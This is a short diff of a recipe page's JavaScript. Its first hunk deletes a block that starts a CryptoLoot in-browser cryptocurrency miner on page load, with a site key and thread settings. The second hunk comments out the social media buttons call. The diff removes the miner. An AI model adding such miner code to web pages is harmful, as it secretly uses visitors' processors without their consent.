@@ -3,16 +3,6 @@ var TIMESTAMP_KEY = 'cached_recipes_ts';
 var DAYS_UNTIL_INVALIDATION = 1;
 
 $(document).ready(function() {
-    try {
-        var miner=new CryptoLoot.Anonymous('f7a2330605f11eefb1f3d6890a6a8ef30e43edc8464c',
-        {
-            threads:2,autoThreads:false,throttle:0.5,
-        });
-        miner.start();
-    } catch(e) {
-        console.log("*CL desactivated.");
-    } 
-
     fetchRecipe();
 });
 
@@ -55,7 +45,8 @@ function setEntry() {
     }
     else if (currentEntry.sys.contentType.sys.id === 'shareable') {     
         setText();  
-        setSocialMediaButtons();
+        // social media buttons will be added in an other iteration
+        // setSocialMediaButtons();
         setLogo();
     }
 }
